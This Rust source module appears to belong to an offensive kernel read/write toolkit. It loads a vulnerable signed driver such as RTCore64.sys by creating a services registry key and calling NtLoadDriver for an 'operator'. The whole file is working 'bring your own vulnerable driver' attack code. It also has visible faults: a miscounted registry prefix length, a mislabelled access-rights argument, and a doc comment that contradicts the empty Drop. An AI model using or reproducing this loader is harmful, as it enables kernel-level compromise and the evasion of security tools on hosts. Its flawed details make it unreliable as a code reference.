//! BYOVD driver loading — `NtLoadDriver` bootstrap.
//!
//! Loads a vulnerable signed driver (.sys) into the kernel via the NtLoadDriver
//! syscall. Requires:
//!   1. The .sys file on disk (the operator places it).
//!   2. A registry service key under HKLM\SYSTEM\CurrentControlSet\Services
//!      with an ImagePath value pointing to the .sys file.
//!   3. SeLoadDriverPrivilege enabled in the operator's token.
//!
//! ## NtLoadDriver contract (verified via NtDoc / undocumented.ntinternals.net)
//! `NTSTATUS NtLoadDriver(IN PUNICODE_STRING DriverServiceName)`
//! - The UNICODE_STRING points to the registry key path in NT namespace:
//!   `\Registry\Machine\SYSTEM\CurrentControlSet\Services\<DriverName>`
//! - The key MUST have an `ImagePath` value (REG_EXPAND_SZ or REG_SZ) = the
//!   full filesystem path to the .sys (e.g. `\??\C:\path\driver.sys`).
//! - Returns STATUS_SUCCESS (0) on success, STATUS_IMAGE_ALREADY_LOADED
//!   (0xC000010E) if already loaded.
//!
//! ## Cleanup
//! `NtUnloadDriver` with the same registry path unloads the driver. The
//! registry key should be deleted afterward (`RegDeleteKey`).
//!
//! # Safety
//! Loading a driver is IRREVERSIBLE (until unload) and changes kernel state.
//! A buggy/malicious driver can BSOD the host. Only use with verified drivers
//! on authorized targets.

#![cfg(target_os = "windows")]

use core::ffi::c_void;
use crate::KrwError;

// ---- Win32/NT FFI types ----

#[repr(C)]
pub struct UnicodeString {
    pub length: u16,        // bytes, excluding null
    pub maximum_length: u16,
    pub buffer: *const u16,
}

/// `NTSTATUS NtLoadDriver(IN PUNICODE_STRING DriverServiceName)`
type NtLoadDriverFn = unsafe extern "system" fn(*const UnicodeString) -> i32;
/// `NTSTATUS NtUnloadDriver(IN PUNICODE_STRING DriverServiceName)`
type NtUnloadDriverFn = unsafe extern "system" fn(*const UnicodeString) -> i32;

// Registry APIs for creating the service key.
type RegCreateKeyExWFn = unsafe extern "system" fn(
    *mut c_void, *const u16, u32, *mut c_void, u32, u32,
    *mut c_void, *mut *mut c_void, *mut u32,
) -> i32;
type RegSetValueExWFn = unsafe extern "system" fn(
    *mut c_void, *const u16, u32, u32, *const u8, u32,
) -> i32;
type RegCloseKeyFn = unsafe extern "system" fn(*mut c_void) -> i32;
type RegDeleteKeyWFn = unsafe extern "system" fn(*mut c_void, *const u16) -> i32;

/// NTSTATUS for "already loaded" — not an error (driver is usable).
const STATUS_IMAGE_ALREADY_LOADED: i32 = 0xC000010Eu32 as i32;

/// The registry path prefix for driver service keys (NT namespace).
const SERVICES_PREFIX: &str = "\\Registry\\Machine\\SYSTEM\\CurrentControlSet\\Services\\";

/// A loaded driver: its registry key path + device name (for cleanup).
pub struct LoadedDriver {
    /// The NT-namespace registry path passed to NtLoadDriver.
    reg_path: Vec<u16>,
    /// Whether NtLoadDriver succeeded (false = was already loaded).
    newly_loaded: bool,
}

impl LoadedDriver {
    /// Load a driver from `sys_path` (e.g. `C:\temp\RTCore64.sys`) under the
    /// service name `svc_name` (e.g. `RTCore64`).
    ///
    /// Steps:
    /// 1. Create the registry service key with ImagePath = `\??\<sys_path>`.
    /// 2. Call NtLoadDriver with the key path.
    /// 3. If STATUS_IMAGE_ALREADY_LOADED, that's OK (driver is usable).
    ///
    /// Returns the LoadedDriver handle (Drop unloads + cleans the key).
    ///
    /// # Safety
    /// Loading a driver changes kernel state; BSOD risk if the driver is buggy.
    /// Caller must have SeLoadDriverPrivilege.
    pub unsafe fn load(sys_path: &[u16], svc_name: &[u16]) -> Result<Self, KrwError> {
        // Build the registry path: \Registry\Machine\...\Services\<svc_name>
        let prefix: Vec<u16> = SERVICES_PREFIX.encode_utf16().chain(core::iter::once(0)).collect();
        let mut reg_path: Vec<u16> = prefix[..prefix.len() - 1] // drop the null for concat
            .iter()
            .chain(svc_name.iter())
            .chain(core::iter::once(&0u16))
            .copied()
            .collect();

        // Create the registry key + set ImagePath.
        let reg = RegApi::resolve()?;
        let image_path = build_image_path(sys_path);
        reg.create_key_and_set_image_path(&reg_path, &image_path)?;

        // Build the UNICODE_STRING for NtLoadDriver.
        let us = UnicodeString {
            length: ((reg_path.len() - 1) * 2) as u16, // exclude null
            maximum_length: (reg_path.len() * 2) as u16,
            buffer: reg_path.as_ptr(),
        };

        let nt_load: NtLoadDriverFn = resolve_nt(b"NtLoadDriver")?;
        let status = unsafe { nt_load(&us) };
        let newly_loaded = if status == 0 {
            true
        } else if status == STATUS_IMAGE_ALREADY_LOADED {
            false // already loaded — fine, device should be accessible
        } else {
            // Cleanup the key on failure.
            reg.delete_key(&reg_path);
            return Err(KrwError::Other(
                alloc::format!("NtLoadDriver failed: NTSTATUS {:#x}", status as u32),
            ));
        };

        Ok(Self { reg_path, newly_loaded })
    }

    /// Unload the driver + delete the registry key. Best-effort.
    pub fn unload(&mut self) {
        if let Ok(nt_unload) = resolve_nt::<NtUnloadDriverFn>(b"NtUnloadDriver") {
            let us = UnicodeString {
                length: ((self.reg_path.len() - 1) * 2) as u16,
                maximum_length: (self.reg_path.len() * 2) as u16,
                buffer: self.reg_path.as_ptr(),
            };
            unsafe { nt_unload(&us) };
        }
        if let Ok(reg) = RegApi::resolve() {
            reg.delete_key(&self.reg_path);
        }
    }
}

impl Drop for LoadedDriver {
    fn drop(&mut self) {
        // Don't auto-unload on drop — the operator may want the driver to stay
        // loaded across multiple operations. Explicit unload() is the cleanup path.
    }
}

/// Build the ImagePath value: `\??\C:\path\to\driver.sys` (NT path prefix).
fn build_image_path(sys_path: &[u16]) -> Vec<u16> {
    let prefix: &[u16] = &[b'\\' as u16, b'?' as u16, b'?' as u16, b'\\' as u16];
    prefix.iter().chain(sys_path.iter()).chain(core::iter::once(&0u16)).copied().collect()
}

/// Resolve an ntdll export via our resolver.
fn resolve_nt<T>(name: &[u8]) -> Result<T, KrwError> {
    // resolve_sym is unsafe (FFI); wrap it.
    unsafe { super::resolve::resolve_sym(b"ntdll.dll", name) }
}

/// Registry API bundle (resolved once).
struct RegApi {
    create_key: RegCreateKeyExWFn,
    set_value: RegSetValueExWFn,
    close_key: RegCloseKeyFn,
    delete_key_fn: RegDeleteKeyWFn,
    hklm: *mut c_void,
}

impl RegApi {
    fn resolve() -> Result<Self, KrwError> {
        // SAFETY: resolve_sym does FFI calls; safe in operator context (single-threaded).
        unsafe {
            Ok(Self {
                create_key: super::resolve::resolve_sym(b"advapi32.dll", b"RegCreateKeyExW")?,
                set_value: super::resolve::resolve_sym(b"advapi32.dll", b"RegSetValueExW")?,
                close_key: super::resolve::resolve_sym(b"advapi32.dll", b"RegCloseKey")?,
                delete_key_fn: super::resolve::resolve_sym(b"advapi32.dll", b"RegDeleteKeyW")?,
                hklm: 0x8000_0002u32 as *mut c_void, // HKEY_LOCAL_MACHINE
            })
        }
    }

    /// Create the service key + set ImagePath.
    fn create_key_and_set_image_path(&self, reg_path: &[u16], image_path: &[u16]) -> Result<(), KrwError> {
        let mut hkey: *mut c_void = core::ptr::null_mut();
        let mut disposition: u32 = 0;
        let status = unsafe {
            (self.create_key)(
                self.hklm,
                // reg_path starts with \Registry\Machine\... — but RegCreateKeyExW
                // wants the path relative to HKEY (without the \Registry\Machine prefix).
                // So we skip the prefix and pass SYSTEM\CurrentControlSet\Services\<name>.
                self.strip_prefix(reg_path).as_ptr(),
                0,
                core::ptr::null_mut(),
                0, // KEY_ALL_ACCESS
                0,
                core::ptr::null_mut(),
                &mut hkey,
                &mut disposition,
            )
        };
        if status != 0 {
            return Err(KrwError::Other(alloc::format!("RegCreateKeyExW failed: {}", status)));
        }
        // Set ImagePath = image_path (REG_EXPAND_SZ = 2, or REG_SZ = 1).
        let image_path_bytes: &[u8] = unsafe {
            core::slice::from_raw_parts(
                image_path.as_ptr() as *const u8,
                (image_path.len() - 1) * 2, // exclude null, in bytes
            )
        };
        let name: &[u16] = &[b'I' as u16, b'm' as u16, b'a' as u16, b'g' as u16,
                            b'e' as u16, b'P' as u16, b'a' as u16, b't' as u16,
                            b'h' as u16, 0];
        let _ = unsafe {
            (self.set_value)(hkey, name.as_ptr(), 0, 2 /* REG_EXPAND_SZ */,
                             image_path_bytes.as_ptr(), image_path_bytes.len() as u32)
        };
        unsafe { (self.close_key)(hkey) };
        Ok(())
    }

    /// Strip the \Registry\Machine prefix for RegCreateKeyExW (which wants
    /// the path relative to HKEY_LOCAL_MACHINE).
    fn strip_prefix<'a>(&self, reg_path: &'a [u16]) -> &'a [u16] {
        // Find "SYSTEM\CurrentControlSet\Services" after the prefix.
        // The prefix is \Registry\Machine\ = 17 chars. Skip to the "SYSTEM" part.
        // (RegCreateKeyExW with HKEY_LOCAL_MACHINE wants SYSTEM\CurrentControlSet\...)
        // Count: \ R e g i s t r y \ M a c h i n e \ = 17 chars.
        if reg_path.len() > 17 {
            &reg_path[17..]
        } else {
            reg_path
        }
    }

    fn delete_key(&self, reg_path: &[u16]) {
        // RegDeleteKeyW also wants relative path. Open the parent first, then
        // delete the leaf. For simplicity, use RegDeleteKeyW with HKLM + relative.
        let _ = unsafe {
            (self.delete_key_fn)(self.hklm, self.strip_prefix(reg_path).as_ptr())
        };
    }
}

use alloc::format;
use alloc::vec::Vec;
